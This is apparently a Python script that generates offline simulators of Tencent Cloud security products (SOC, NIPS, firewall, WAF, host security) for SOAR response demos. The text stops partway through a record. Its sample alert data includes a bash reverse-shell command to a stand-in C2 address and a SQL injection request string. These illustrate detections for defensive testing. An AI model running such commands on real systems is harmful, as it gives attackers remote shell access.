# -*- coding: utf-8 -*-
"""Generate self-contained Tencent Cloud security simulator apps.

The generated apps are deliberately offline. They model product-shaped inputs,
outputs, persistent policy state, health failures, TTL expiry, and audit logs
without requiring Tencent Cloud credentials or network access.
"""

from __future__ import annotations

import json
from pathlib import Path
from string import Template


ROOT = Path(__file__).resolve().parents[1]
SUPPLIER = "雾帜智能"
VERSION = "1.0.0"
DEFAULT_SOURCE_IP = "203.0.113.77"
DEFAULT_C2_IP = "198.51.100.66"
DEFAULT_WEB_IP = "10.10.8.23"
DEFAULT_DB_IP = "10.10.9.15"
DEFAULT_TRACE_ID = "demo-trace-web-0001"


def parameter(
    description,
    data_type="string",
    required=False,
    default=None,
    order=0,
):
    value = {
        "data_type": data_type,
        "description": description,
        "required": required,
        "order": order,
    }
    if default is not None:
        value["default_value"] = default
    return value


def action(
    name,
    description,
    *,
    operation="query",
    classify="query",
    parameters=None,
    sample=None,
    record_kinds=None,
    filter_map=None,
    target_params=None,
    result_status=None,
    policy_kind=None,
    policy_prefix=None,
    id_param=None,
    create_kind=None,
):
    value = {
        "action": name,
        "description": description,
        "operation": operation,
        "classify": classify,
        "parameters": parameters or {},
        "sample": sample or {},
        "record_kinds": record_kinds or [],
        "filter_map": filter_map or {},
        "target_params": target_params or [],
    }
    optional = {
        "result_status": result_status,
        "policy_kind": policy_kind,
        "policy_prefix": policy_prefix,
        "id_param": id_param,
        "create_kind": create_kind,
    }
    value.update({key: item for key, item in optional.items() if item is not None})
    return value


def audit_parameters(start_order=10):
    return {
        "trace_id": parameter(
            "SOAR 链路追踪 ID",
            default=DEFAULT_TRACE_ID,
            order=start_order,
        ),
        "operator": parameter(
            "操作者账号",
            default="soar-demo",
            order=start_order + 1,
        ),
        "trigger_source": parameter(
            "触发来源，例如 soc_alert、manual、scheduled",
            default="soc_alert",
            order=start_order + 2,
        ),
        "approval_id": parameter(
            "审批单 ID；需要审批时由剧本传入",
            order=start_order + 3,
        ),
    }


def block_parameters(extra=None):
    values = {
        "ip": parameter("需要封禁的 IP", required=True, order=0),
        "reason": parameter("封禁原因", default="SOAR 高危告警联动", order=1),
        "ttl_minutes": parameter(
            "封禁时长（分钟），0 表示永久",
            data_type="integer",
            default=60,
            order=2,
        ),
    }
    values.update(extra or {})
    values.update(audit_parameters())
    return values


def release_parameters(extra=None):
    values = {
        "policy_id": parameter("策略 ID；与目标至少填写一项", order=0),
        "ip": parameter("需要解封的 IP；与策略 ID 至少填写一项", order=1),
        "reason": parameter("解封原因", default="TTL 到期或人工复核", order=2),
    }
    values.update(extra or {})
    values.update(audit_parameters())
    return values


def history_action():
    return action(
        "query_operation_history",
        "查询产品模拟操作审计记录",
        operation="history",
        parameters={
            "trace_id": parameter("按 trace_id 过滤", order=0),
            "target": parameter("按目标 IP、资产或策略 ID 过滤", order=1),
            "limit": parameter("返回数量", "integer", default=50, order=2),
        },
        sample={"trace_id": DEFAULT_TRACE_ID, "limit": 20},
    )


def health_action(name="health_check", description="检查模拟 API、鉴权和组件状态"):
    return action(name, description, operation="health")


def policy_seed(
    policy_id,
    kind,
    name,
    ip,
    *,
    status="active",
    owner="soar-demo",
    severity="high",
    summary,
    **data,
):
    details = {
        "policy_id": policy_id,
        "trace_id": data.pop("trace_id", DEFAULT_TRACE_ID),
        "operator": data.pop("operator", owner),
        "trigger_source": data.pop("trigger_source", "soc_alert"),
        **data,
    }
    return {
        "id": policy_id,
        "kind": kind,
        "name": name,
        "ip": ip,
        "owner": owner,
        "status": status,
        "severity": severity,
        "summary": summary,
        "data": details,
    }


COMMON_ALERT_1 = {
    "alert_id": "soc-alert-20260724-0001",
    "asset_id": "asset-cvm-prod-web-01",
    "host_id": "ins-prod-web-01",
    "business_id": "biz-checkout",
    "business_name": "统一收银台",
    "owner": "alice",
    "src_ip": DEFAULT_SOURCE_IP,
    "dst_ip": DEFAULT_WEB_IP,
    "host_ip": DEFAULT_WEB_IP,
    "external_ip": DEFAULT_SOURCE_IP,
    "direction": "inbound",
    "confidence": 96,
    "trace_id": DEFAULT_TRACE_ID,
    "occurred_at": "2026-07-24T09:31:22+08:00",
}

COMMON_ALERT_2 = {
    "alert_id": "soc-alert-20260724-0002",
    "asset_id": "asset-cvm-prod-web-01",
    "host_id": "ins-prod-web-01",
    "business_id": "biz-checkout",
    "business_name": "统一收银台",
    "owner": "alice",
    "src_ip": DEFAULT_WEB_IP,
    "dst_ip": DEFAULT_C2_IP,
    "host_ip": DEFAULT_WEB_IP,
    "external_ip": DEFAULT_C2_IP,
    "direction": "outbound",
    "confidence": 99,
    "trace_id": "demo-trace-reverse-shell-0002",
    "occurred_at": "2026-07-24T10:06:48+08:00",
}

COMMON_ALERT_3 = {
    "alert_id": "soc-alert-20260724-0003",
    "asset_id": "asset-cvm-prod-web-01",
    "host_id": "ins-prod-web-01",
    "business_id": "biz-checkout",
    "business_name": "统一收银台",
    "owner": "alice",
    "src_ip": DEFAULT_WEB_IP,
    "dst_ip": DEFAULT_DB_IP,
    "host_ip": DEFAULT_WEB_IP,
    "external_ip": "",
    "direction": "east_west",
    "confidence": 91,
    "trace_id": "demo-trace-lateral-0003",
    "occurred_at": "2026-07-24T10:12:03+08:00",
}


APP_SPECS = [
    {
        "name": "tencent_soc_sim",
        "module": "tencent_soc_sim",
        "product_name": "腾讯云 SOC（模拟）",
        "description": "离线模拟腾讯云 SOC 的告警汇聚、事件分级、链路健康和处置回写能力",
        "category": "安全产品",
        "letter": "S",
        "colors": ("#0052d9", "#00a4ff"),
        "health_components": [
            "Syslog 接收链路",
            "Kafka 消费链路",
            "告警归一化引擎",
            "事件回写接口",
        ],
        "records": [
            {
                "id": COMMON_ALERT_1["alert_id"],
                "kind": "soc_alert",
                "name": "支付站点 SQL 注入攻击",
                "ip": DEFAULT_SOURCE_IP,
                "owner": "alice",
                "status": "new",
                "severity": "critical",
                "summary": "WAF 检测到高置信 SQL 注入，建议联动天幕与 WAF 封禁来源 IP",
                "data": {
                    **COMMON_ALERT_1,
                    "alert_type": "web_sql_injection",
                    "ingestion_channel": "kafka",
                    "suggested_products": ["tencent_tianmu_sim", "tencent_waf_sim"],
                    "white_list_hit": False,
                },
            },
            {
                "id": COMMON_ALERT_2["alert_id"],
                "kind": "soc_alert",
                "name": "主机反弹 Shell 与矿池外联",
                "ip": DEFAULT_WEB_IP,
                "owner": "alice",
                "status": "new",
                "severity": "critical",
                "summary": "主机安全检测到异常 bash 进程连接外部 C2，建议 CFW/天幕双向阻断",
                "data": {
                    **COMMON_ALERT_2,
                    "alert_type": "reverse_shell",
                    "process_name": "bash",
                    "command_line": "bash -i >& /dev/tcp/198.51.100.66/4444 0>&1",
                    "ingestion_channel": "syslog",
                    "suggested_products": ["tencent_cfw_sim", "tencent_tianmu_sim"],
                    "white_list_hit": False,
                },
            },
            {
                "id": COMMON_ALERT_3["alert_id"],
                "kind": "soc_alert",
                "name": "VPC 内横向访问核心数据库",
                "ip": DEFAULT_WEB_IP,
                "owner": "alice",
                "status": "investigating",
                "severity": "high",
                "summary": "Web 主机异常访问核心数据库管理端口，建议使用 CFW 限制东西向流量",
                "data": {
                    **COMMON_ALERT_3,
                    "alert_type": "lateral_movement",
                    "protocol": "TCP",
                    "port": 3306,
                    "ingestion_channel": "kafka",
                    "suggested_products": ["tencent_cfw_sim"],
                    "white_list_hit": False,
                },
            },
        ],
        "actions": [
            health_action(),
            health_action(
                "query_ingestion_health",
                "查询 Syslog/Kafka 告警外发链路和最近告警时间",
            ),
            action(
                "fetch_high_risk_alerts",
                "拉取待处置的高危告警",
                record_kinds=["soc_alert"],
                filter_map={"severity": ["severity"], "status": ["status"]},
                parameters={
                    "severity": parameter("告警等级", default="critical", order=0),
                    "status": parameter("告警状态", default="new", order=1),
                    "limit": parameter("返回数量", "integer", default=20, order=2),
                },
                sample={"severity": "critical", "status": "new", "limit": 20},
            ),
            action(
                "query_alert_detail",
                "根据告警 ID 查询完整处置上下文",
                record_kinds=["soc_alert"],
                filter_map={"alert_id": ["id", "alert_id"]},
                parameters={
                    "alert_id": parameter("SOC 告警 ID", required=True, order=0),
                },
                sample={"alert_id": COMMON_ALERT_1["alert_id"]},
            ),
            action(
                "emit_demo_alert",
                "生成一条手动演示告警",
                operation="create_record",
                classify="write",
                create_kind="soc_alert",
                id_param="alert_id",
                result_status="new",
                parameters={
                    "alert_id": parameter("告警 ID；不填则自动生成", order=0),
                    "alert_name": parameter("告警名称", default="手动演示高危告警", order=1),
                    "alert_type": parameter("告警类型", default="web_attack", order=2),
                    "src_ip": parameter("攻击源 IP", default=DEFAULT_SOURCE_IP, order=3),
                    "dst_ip": parameter("受害资产 IP", default=DEFAULT_WEB_IP, order=4),
                    "asset_id": parameter("受害资产 ID", default=COMMON_ALERT_1["asset_id"], order=5),
                    "owner": parameter("资产负责人", default="alice", order=6),
                    "severity": parameter("告警等级", default="high", order=7),
                    "confidence": parameter("置信度 0-100", "integer", default=90, order=8),
                    **audit_parameters(20),
                },
                sample={
                    "alert_name": "手动演示 Web 攻击告警",
                    "src_ip": DEFAULT_SOURCE_IP,
                    "dst_ip": DEFAULT_WEB_IP,
                    "asset_id": COMMON_ALERT_1["asset_id"],
                    "owner": "alice",
                    "severity": "high",
                    "confidence": 95,
                    "trace_id": "demo-trace-manual-0004",
                },
            ),
            action(
                "update_alert_status",
                "更新 SOC 告警状态",
                operation="update_record",
                classify="write",
                record_kinds=["soc_alert"],
                filter_map={"alert_id": ["id", "alert_id"]},
                target_params=["alert_id"],
                parameters={
                    "alert_id": parameter("SOC 告警 ID", required=True, order=0),
                    "status": parameter("目标状态", default="investigating", order=1),
                    "comment": parameter("状态说明", default="SOAR 已开始处置", order=2),
                    **audit_parameters(),
                },
                sample={
                    "alert_id": COMMON_ALERT_1["alert_id"],
                    "status": "investigating",
                    "comment": "SOAR 已完成上下文增强",
                    "trace_id": DEFAULT_TRACE_ID,
                },
            ),
            action(
                "writeback_disposition",
                "回写跨产品处置结果和策略 ID",
                operation="update_record",
                classify="write",
                record_kinds=["soc_alert"],
                filter_map={"alert_id": ["id", "alert_id"]},
                target_params=["alert_id"],
                result_status="closed",
                parameters={
                    "alert_id": parameter("SOC 告警 ID", required=True, order=0),
                    "status": parameter("处置状态", default="closed", order=1),
                    "disposition": parameter("处置结论", default="confirmed_malicious", order=2),
                    "policy_ids": parameter("关联策略 ID，多个值用逗号分隔", order=3),
                    "comment": parameter("处置说明", default="已完成网络侧阻断", order=4),
                    **audit_parameters(),
                },
                sample={
                    "alert_id": COMMON_ALERT_1["alert_id"],
                    "status": "closed",
                    "disposition": "confirmed_malicious",
                    "policy_ids": "tm-pol-demo-0001,waf-pol-demo-0001",
                    "trace_id": DEFAULT_TRACE_ID,
                },
            ),
            history_action(),
        ],
    },
    {
        "name": "tencent_tianmu_sim",
        "module": "tencent_tianmu_sim",
        "product_name": "腾讯天幕 NIPS（模拟）",
        "description": "离线模拟腾讯天幕旁路阻断、解封、策略查询、TTL 到期和审计能力",
        "category": "安全产品",
        "letter": "T",
        "colors": ("#7b2cbf", "#00b4d8"),
        "health_components": ["旁路阻断 API", "解封 API", "策略同步引擎", "流量探针"],
        "records": [
            policy_seed(
                "tm-pol-demo-0001",
                "tianmu_block_policy",
                "SQL 注入攻击源旁路阻断",
                DEFAULT_SOURCE_IP,
                summary="由 SOC 高危 Web 攻击告警触发的 4 层旁路阻断策略",
                ttl_minutes=60,
                created_at="2026-07-24T09:34:00+08:00",
                expires_at="2099-07-24T10:34:00+08:00",
                scope="global",
                direction="bidirectional",
                alert_id=COMMON_ALERT_1["alert_id"],
            ),
            policy_seed(
                "tm-pol-demo-0002",
                "tianmu_block_policy",
                "历史恶意扫描源阻断",
                "192.0.2.44",
                status="released",
                severity="medium",
                summary="TTL 到期后已自动解封的历史策略",
                ttl_minutes=30,
                created_at="2026-07-24T08:00:00+08:00",
                expires_at="2026-07-24T08:30:00+08:00",
                released_at="2026-07-24T08:30:03+08:00",
                scope="global",
            ),
        ],
        "actions": [
            health_action(),
            action(
                "list_block_policies",
                "查询旁路阻断策略",
                record_kinds=["tianmu_block_policy"],
                filter_map={
                    "policy_id": ["id", "policy_id"],
                    "ip": ["ip"],
                    "status": ["status"],
                    "trace_id": ["trace_id"],
                },
                parameters={
                    "policy_id": parameter("策略 ID", order=0),
                    "ip": parameter("封禁 IP", order=1),
                    "status": parameter("策略状态", order=2),
                    "trace_id": parameter("SOAR trace_id", order=3),
                    "limit": parameter("返回数量", "integer", default=50, order=4),
                },
                sample={"ip": DEFAULT_SOURCE_IP},
            ),
            action(
                "block_ip",
                "创建天幕旁路 IP 阻断策略",
                operation="create_policy",
                classify="write",
                policy_kind="tianmu_block_policy",
                policy_prefix="tm-pol",
                target_params=["ip"],
                result_status="active",
                parameters=block_parameters(
                    {
                        "scope": parameter("阻断范围", default="global", order=3),
                        "direction": parameter("阻断方向", default="bidirectional", order=4),
                        "alert_id": parameter("关联 SOC 告警 ID", order=5),
                    }
                ),
                sample={
                    "ip": DEFAULT_C2_IP,
                    "reason": "反弹 Shell 外联 C2",
                    "ttl_minutes": 120,
                    "scope": "global",
                    "direction": "bidirectional",
                    "alert_id": COMMON_ALERT_2["alert_id"],
                    "trace_id": COMMON_ALERT_2["trace_id"],
                },
            ),
            action(
                "unblock_ip",
                "解除天幕旁路 IP 阻断",
                operation="release_policy",
                classify="write",
                policy_kind="tianmu_block_policy",
                target_params=["policy_id", "ip"],
                result_status="released",
                parameters=release_parameters(),
                sample={
                    "policy_id": "tm-pol-demo-0001",
                    "ip": DEFAULT_SOURCE_IP,
                    "reason": "人工复核后解除",
                    "trace_id": DEFAULT_TRACE_ID,
                },
            ),
            action(
                "expire_due_policies",
                "扫描并自动释放已到期策略",
                operation="expire_policies",
                classify="write",
                policy_kind="tianmu_block_policy",
                result_status="expired",
                parameters={
                    "as_of": parameter("到期判断时间，ISO 8601；默认当前时间", order=0),
                    **audit_parameters(),
                },
                sample={
                    "as_of": "2100-01-01T00:00:00+08:00",
                    "trigger_source": "scheduled",
                    "trace_id": "demo-trace-ttl-tianmu",
                },
            ),
            history_action(),
        ],
    },
    {
        "name": "tencent_cfw_sim",
        "module": "tencent_cfw_sim",
        "product_name": "腾讯云防火墙 CFW（模拟）",
        "description": "离线模拟腾讯云防火墙的 VPC 间访问控制、策略同步、TTL 回滚和审计能力",
        "category": "安全产品",
        "letter": "F",
        "colors": ("#d4380d", "#faad14"),
        "health_components": ["CFW API 网关", "VPC 间防火墙", "访问控制策略同步", "日志审计"],
        "records": [
            {
                "id": "cfw-vpc-fw-prod-01",
                "kind": "cfw_vpc_firewall",
                "name": "生产 VPC 间防火墙",
                "ip": "",
                "owner": "cloud-sec",
                "status": "running",
                "severity": "medium",
                "summary": "保护生产 Web VPC 与数据 VPC 之间的东西向访问",
                "data": {
                    "firewall_id": "cfw-vpc-fw-prod-01",
                    "source_vpc_id": "vpc-web-prod",
                    "destination_vpc_id": "vpc-data-prod",
                    "region": "ap-guangzhou",
                    "sync_status": "synced",
                },
            },
            policy_seed(
                "cfw-rule-demo-0001",
                "cfw_vpc_block_rule",
                "阻断 Web 主机访问核心数据库管理端口",
                DEFAULT_WEB_IP,
                summary="VPC 间高优先级拒绝规则，限制异常东西向访问",
                trace_id=COMMON_ALERT_3["trace_id"],
                source=DEFAULT_WEB_IP,
                destination=DEFAULT_DB_IP,
                source_vpc_id="vpc-web-prod",
                destination_vpc_id="vpc-data-prod",
                protocol="TCP",
                port="3306",
                direction="east_west",
                action="deny",
                priority=10,
                ttl_minutes=120,
                expires_at="2099-07-24T12:12:03+08:00",
                alert_id=COMMON_ALERT_3["alert_id"],
            ),
        ],
        "actions": [
            health_action(),
            action(
                "list_vpc_firewalls",
                "查询 VPC 间防火墙及策略同步状态",
                record_kinds=["cfw_vpc_firewall"],
                filter_map={
                    "firewall_id": ["id", "firewall_id"],
                    "region": ["region"],
                    "status": ["status"],
                },
                parameters={
                    "firewall_id": parameter("VPC 间防火墙 ID", order=0),
                    "region": parameter("地域", order=1),
                    "status": parameter("状态", order=2),
                },
                sample={"firewall_id": "cfw-vpc-fw-prod-01"},
            ),
            action(
                "list_vpc_access_rules",
                "查询 VPC 间访问控制规则",
                record_kinds=["cfw_vpc_block_rule"],
                filter_map={
                    "policy_id": ["id", "policy_id"],
                    "source": ["source", "ip"],
                    "destination": ["destination"],
                    "status": ["status"],
                    "trace_id": ["trace_id"],
                },
                parameters={
                    "policy_id": parameter("策略 ID", order=0),
                    "source": parameter("源 IP/CIDR", order=1),
                    "destination": parameter("目的 IP/CIDR", order=2),
                    "status": parameter("策略状态", order=3),
                    "trace_id": parameter("SOAR trace_id", order=4),
                    "limit": parameter("返回数量", "integer", default=50, order=5),
                },
                sample={"source": DEFAULT_WEB_IP, "destination": DEFAULT_DB_IP},
            ),
            action(
                "create_vpc_block_rule",
                "创建 VPC 间拒绝访问规则",
                operation="create_policy",
                classify="write",
                policy_kind="cfw_vpc_block_rule",
                policy_prefix="cfw-rule",
                target_params=["source", "destination", "protocol", "port"],
                result_status="active",
                parameters={
                    "source": parameter("源 IP/CIDR", required=True, order=0),
                    "destination": parameter("目的 IP/CIDR", required=True, order=1),
                    "source_vpc_id": parameter("源 VPC ID", default="vpc-web-prod", order=2),
                    "destination_vpc_id": parameter("目的 VPC ID", default="vpc-data-prod", order=3),
                    "protocol": parameter("协议", default="TCP", order=4),
                    "port": parameter("目的端口", default="ALL", order=5),
                    "direction": parameter("访问方向", default="east_west", order=6),
                    "reason": parameter("阻断原因", default="SOAR 横向访问处置", order=7),
                    "ttl_minutes": parameter("策略时长（分钟），0 表示永久", "integer", default=120, order=8),
                    "alert_id": parameter("关联 SOC 告警 ID", order=9),
                    **audit_parameters(20),
                },
                sample={
                    "source": DEFAULT_WEB_IP,
                    "destination": DEFAULT_DB_IP,
                    "protocol": "TCP",
                    "port": "3306",
                    "reason": "Web 主机异常访问数据库",
                    "ttl_minutes": 120,
                    "alert_id": COMMON_ALERT_3["alert_id"],
                    "trace_id": COMMON_ALERT_3["trace_id"],
                },
            ),
            action(
                "delete_vpc_access_rule",
                "删除或回滚 VPC 间访问控制规则",
                operation="release_policy",
                classify="write",
                policy_kind="cfw_vpc_block_rule",
                target_params=["policy_id", "source", "destination"],
                result_status="released",
                parameters={
                    "policy_id": parameter("策略 ID", order=0),
                    "source": parameter("源 IP/CIDR", order=1),
                    "destination": parameter("目的 IP/CIDR", order=2),
                    "reason": parameter("回滚原因", default="TTL 到期或人工复核", order=3),
                    **audit_parameters(),
                },
                sample={
                    "policy_id": "cfw-rule-demo-0001",
                    "source": DEFAULT_WEB_IP,
                    "destination": DEFAULT_DB_IP,
                    "trace_id": COMMON_ALERT_3["trace_id"],
                },
            ),
            action(
                "expire_due_policies",
                "扫描并回滚已到期 CFW 规则",
                operation="expire_policies",
                classify="write",
                policy_kind="cfw_vpc_block_rule",
                result_status="expired",
                parameters={
                    "as_of": parameter("到期判断时间，ISO 8601；默认当前时间", order=0),
                    **audit_parameters(),
                },
                sample={
                    "as_of": "2100-01-01T00:00:00+08:00",
                    "trigger_source": "scheduled",
                    "trace_id": "demo-trace-ttl-cfw",
                },
            ),
            history_action(),
        ],
    },
    {
        "name": "tencent_waf_sim",
        "module": "tencent_waf_sim",
        "product_name": "腾讯云 WAF（模拟）",
        "description": "离线模拟腾讯云 WAF 的域名防护、攻击事件、IP 黑名单、解封和 TTL 审计能力",
        "category": "安全产品",
        "letter": "W",
        "colors": ("#096dd9", "#36cfc9"),
        "health_components": ["WAF API 网关", "域名防护引擎", "IP 黑白名单", "策略下发队列"],
        "records": [
            {
                "id": "waf-domain-checkout",
                "kind": "waf_domain",
                "name": "checkout.example.com",
                "ip": DEFAULT_WEB_IP,
                "owner": "alice",
                "status": "protected",
                "severity": "medium",
                "summary": "统一收银台公网域名，启用 SQLi、XSS 和 RCE 防护",
                "data": {
                    "domain": "checkout.example.com",
                    "asset_id": COMMON_ALERT_1["asset_id"],
                    "business_id": "biz-checkout",
                    "protection_mode": "block",
                    "region": "ap-guangzhou",
                },
            },
            {
                "id": "waf-event-20260724-0001",
                "kind": "waf_attack_event",
                "name": "SQL 注入攻击",
                "ip": DEFAULT_SOURCE_IP,
                "owner": "alice",
                "status": "blocked",
                "severity": "critical",
                "summary": "攻击者请求 /pay?id=1 OR 1=1，命中 SQL 注入规则",
                "data": {
                    **COMMON_ALERT_1,
                    "event_id": "waf-event-20260724-0001",
                    "domain": "checkout.example.com",
                    "uri": "/pay?id=1%20OR%201=1",
                    "attack_type": "SQL Injection",
                    "rule_id": "waf-rule-sqli-001",
                },
            },
            policy_seed(
                "waf-pol-demo-0001",
                "waf_ip_block_policy",
                "支付站点攻击源 IP 黑名单",
                DEFAULT_SOURCE_IP,
                summary="针对 checkout.example.com 的攻击源 IP 封禁策略",
                domain="checkout.example.com",
                action="deny",
                ttl_minutes=60,
                expires_at="2099-07-24T10:34:00+08:00",
                alert_id=COMMON_ALERT_1["alert_id"],
            ),
        ],
        "actions": [
            health_action(),
            action(
                "list_protected_domains",
                "查询 WAF 受保护域名",
                record_kinds=["waf_domain"],
                filter_map={"domain": ["name", "domain"], "status": ["status"]},
                parameters={
                    "domain": parameter("受保护域名", order=0),
                    "status": parameter("防护状态", order=1),
                },
                sample={"domain": "checkout.example.com"},
            ),
            action(
                "query_attack_events",
                "查询 Web 攻击事件",
                record_kinds=["waf_attack_event"],
                filter_map={
                    "source_ip": ["src_ip", "ip"],
                    "domain": ["domain"],
                    "severity": ["severity"],
                    "trace_id": ["trace_id"],
                },
                parameters={
                    "source_ip": parameter("攻击源 IP", order=0),
                    "domain": parameter("受攻击域名", order=1),
                    "severity": parameter("告警等级", order=2),
                    "trace_id": parameter("SOAR trace_id", order=3),
                    "limit": parameter("返回数量", "integer", default=50, order=4),
                },
                sample={"source_ip": DEFAULT_SOURCE_IP, "domain": "checkout.example.com"},
            ),
            action(
                "list_ip_block_policies",
                "查询 WAF IP 黑名单策略",
                record_kinds=["waf_ip_block_policy"],
                filter_map={
                    "policy_id": ["id", "policy_id"],
                    "ip": ["ip"],
                    "domain": ["domain"],
                    "status": ["status"],
                    "trace_id": ["trace_id"],
                },
                parameters={
                    "policy_id": parameter("策略 ID", order=0),
                    "ip": parameter("来源 IP", order=1),
                    "domain": parameter("防护域名", order=2),
                    "status": parameter("策略状态", order=3),
                    "trace_id": parameter("SOAR trace_id", order=4),
                    "limit": parameter("返回数量", "integer", default=50, order=5),
                },
                sample={"ip": DEFAULT_SOURCE_IP, "domain": "checkout.example.com"},
            ),
            action(
                "block_source_ip",
                "在指定 WAF 域名上封禁攻击源 IP",
                operation="create_policy",
                classify="write",
                policy_kind="waf_ip_block_policy",
                policy_prefix="waf-pol",
                target_params=["domain", "ip"],
                result_status="active",
                parameters=block_parameters(
                    {
                        "domain": parameter("WAF 防护域名", required=True, order=3),
                        "alert_id": parameter("关联 SOC 告警 ID", order=4),
                    }
                ),
                sample={
                    "ip": DEFAULT_SOURCE_IP,
                    "domain": "checkout.example.com",
                    "reason": "SQL 注入攻击",
                    "ttl_minutes": 60,
                    "alert_id": COMMON_ALERT_1["alert_id"],
                    "trace_id": DEFAULT_TRACE_ID,
                },
            ),
            action(
                "unblock_source_ip",
                "解除 WAF 攻击源 IP 封禁",
                operation="release_policy",
                classify="write",
                policy_kind="waf_ip_block_policy",
                target_params=["policy_id", "domain", "ip"],
                result_status="released",
                parameters=release_parameters(
                    {
                        "domain": parameter("WAF 防护域名", order=3),
                    }
                ),
                sample={
                    "policy_id": "waf-pol-demo-0001",
                    "ip": DEFAULT_SOURCE_IP,
                    "domain": "checkout.example.com",
                    "trace_id": DEFAULT_TRACE_ID,
                },
            ),
            action(
                "expire_due_policies",
                "扫描并解除已到期 WAF IP 策略",
                operation="expire_policies",
                classify="write",
                policy_kind="waf_ip_block_policy",
                result_status="expired",
                parameters={
                    "as_of": parameter("到期判断时间，ISO 8601；默认当前时间", order=0),
                    **audit_parameters(),
                },
                sample={
                    "as_of": "2100-01-01T00:00:00+08:00",
                    "trigger_source": "scheduled",
                    "trace_id": "demo-trace-ttl-waf",
                },
            ),
            history_action(),
        ],
    },
    {
        "name": "tencent_hids_sim",
        "module": "tencent_hids_sim",
        "product_name": "腾讯云主机安全 HIDS/CWP（模拟）",
        "description": "离线模拟腾讯云主机安全的主机、告警、进程、外联线索和告警处置状态",
        "category": "安全产品",
        "letter": "H",
        "colors": ("#237804", "#73d13d"),
        "health_components": ["主机安全云 API", "Agent 在线率", "告警检索接口", "资产指纹索引"],
        "records": [
            {
                "id": "ins-prod-web-01",
                "kind": "hids_host",
                "name": "prod-web-01",
                "ip": DEFAULT_WEB_IP,
                "owner": "alice",
                "status": "protected",
                "severity": "high",
                "summary": "统一收银台 Web 主机，主机安全 Agent 在线",
                "data": {
                    "host_id": "ins-prod-web-01",
                    "asset_id": COMMON_ALERT_2["asset_id"],
                    "business_id": COMMON_ALERT_2["business_id"],
                    "os": "TencentOS Server 3.2",
                    "agent_status": "online",
                    "is_critical": True,
                    "region": "ap-guangzhou",
                },
            },
            {
                "id": "hids-alert-20260724-0001",
                "kind": "hids_alert",
                "name": "反弹 Shell",
                "ip": DEFAULT_WEB_IP,
                "owner": "alice",
                "status": "new",
                "severity": "critical",
                "summary": "www-data 启动交互式 bash 并连接外部 C2",
                "data": {
                    **COMMON_ALERT_2,
                    "hids_alert_id": "hids-alert-20260724-0001",
                    "alert_type": "reverse_shell",
                    "process_id": 18422,
                    "process_name": "bash",
                    "command_line": "bash -i >& /dev/tcp/198.51.100.66/4444 0>&1",
                    "user": "www-data",
                },
            },
            {
                "id": "hids-process-18422",
                "kind": "hids_process",
                "name": "bash",
                "ip": DEFAULT_WEB_IP,
                "owner": "alice",
                "status": "running",
                "severity": "critical",
                "summary": "可疑 bash 进程，由 nginx worker 派生",
                "data": {
                    "host_id": "ins-prod-web-01",
                    "asset_id": COMMON_ALERT_2["asset_id"],
                    "pid": 18422,
                    "parent_pid": 921,
                    "parent_name": "nginx",
                    "user": "www-data",
                    "command_line": "bash -i >& /dev/tcp/198.51.100.66/4444 0>&1",
                    "trace_id": COMMON_ALERT_2["trace_id"],
                },
            },
            {
                "id": "hids-conn-20260724-0001",
                "kind": "hids_connection",
                "name": "异常 C2 外联",
                "ip": DEFAULT_C2_IP,
                "owner": "alice",
                "status": "established",
                "severity": "critical",
                "summary": "主机 10.10.8.23:49822 连接 198.51.100.66:4444",
                "data": {
                    "host_id": "ins-prod-web-01",
                    "asset_id": COMMON_ALERT_2["asset_id"],
                    "src_ip": DEFAULT_WEB_IP,
                    "src_port": 49822,
                    "dst_ip": DEFAULT_C2_IP,
                    "dst_port": 4444,
                    "protocol": "TCP",
                    "direction": "outbound",
                    "process_id": 18422,
                    "trace_id": COMMON_ALERT_2["trace_id"],
                },
            },
        ],
        "actions": [
            health_action(),
            action(
                "query_host",
                "查询主机安全资产详情",
                record_kinds=["hids_host"],
                filter_map={"host_id": ["id", "host_id"], "ip": ["ip"]},
                parameters={
                    "host_id": parameter("主机 ID", order=0),
                    "ip": parameter("主机 IP", order=1),
                },
                sample={"host_id": "ins-prod-web-01"},
            ),
            action(
                "query_host_alerts",
                "查询主机安全告警",
                record_kinds=["hids_alert"],
                filter_map={
                    "alert_id": ["id", "hids_alert_id"],
                    "host_id": ["host_id"],
                    "severity": ["severity"],
                    "status": ["status"],
                },
                parameters={
                    "alert_id": parameter("主机安全告警 ID", order=0),
                    "host_id": parameter("主机 ID", order=1),
                    "severity": parameter("告警等级", order=2),
                    "status": parameter("告警状态", order=3),
                    "limit": parameter("返回数量", "integer", default=50, order=4),
                },
                sample={"host_id": "ins-prod-web-01", "severity": "critical"},
            ),
            action(
                "query_processes",
                "查询主机进程线索",
                record_kinds=["hids_process"],
                filter_map={"host_id": ["host_id"], "process_name": ["name"]},
                parameters={
                    "host_id": parameter("主机 ID", required=True, order=0),
                    "process_name": parameter("进程名", order=1),
                    "limit": parameter("返回数量", "integer", default=50, order=2),
                },
                sample={"host_id": "ins-prod-web-01", "process_name": "bash"},
            ),
            action(
                "query_outbound_connections",
                "查询主机外联线索",
                record_kinds=["hids_connection"],
                filter_map={
                    "host_id": ["host_id"],
                    "external_ip": ["dst_ip", "ip"],
                    "process_id": ["process_id"],
                },
                parameters={
                    "host_id": parameter("主机 ID", required=True, order=0),
                    "external_ip": parameter("外联 IP", order=1),
                    "process_id": parameter("进程 ID", "integer", order=2),
                    "limit": parameter("返回数量", "integer", default=50, order=3),
                },
                sample={"host_id": "ins-prod-web-01", "external_ip": DEFAULT_C2_IP},
            ),
            action(
                "update_alert_status",
                "更新主机安全告警状态",
                operation="update_record",
                classify="write",
                record_kinds=["hids_alert"],
                filter_map={"alert_id": ["id", "hids_alert_id"]},
                target_params=["alert_id"],
                parameters={
                    "alert_id": parameter("主机安全告警 ID", required=True, order=0),
                    "status": parameter("目标状态", default="processing", order=1),
                    "comment": parameter("处置说明", default="SOAR 已联动网络侧阻断", order=2),
                    **audit_parameters(),
                },
                sample={
                    "alert_id": "hids-alert-20260724-0001",
                    "status": "processing",
                    "comment": "已对外联 C2 下发 CFW 与天幕策略",
                    "trace_id": COMMON_ALERT_2["trace_id"],
                },
            ),
            history_action(),
        ],
    },
    {
        "name": "tencent_tcss_sim",
        "module": "tencent_tcss_sim",
        "product_name": "腾讯云容器安全 TCSS（模拟）",
        "description": "离线模拟腾讯云容器安全的集群、运行时告警、异常进程、恶意外联和健康状态",
        "category": "安全产品",
        "letter": "C",
        "colors": ("#003a8c", "#69c0ff"),
        "health_components": ["容器安全云 API", "运行时传感器", "K8s API 审计", "告警检索接口"],
        "records": [
            {
                "id": "cls-prod-checkout",
                "kind": "tcss_cluster",
